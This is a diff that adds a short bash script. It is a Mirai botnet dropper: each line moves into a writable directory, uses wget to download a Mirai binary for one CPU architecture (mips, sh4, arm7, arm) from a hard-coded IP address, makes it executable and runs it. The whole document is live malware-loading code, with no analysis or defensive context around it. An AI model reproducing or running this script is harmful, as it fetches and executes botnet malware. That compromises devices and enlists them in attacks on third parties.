@@ -1,0 +1,6 @@
+#!/bin/bash
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.126/mirai.mips; chmod +x mirai.mips; ./mirai.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.126/mirai.sh4; chmod +x mirai.sh4; ./mirai.sh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.126/mirai.arm7; chmod +x mirai.arm7; ./mirai.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.126/mirai.arm; chmod +x mirai.arm; ./mirai.arm
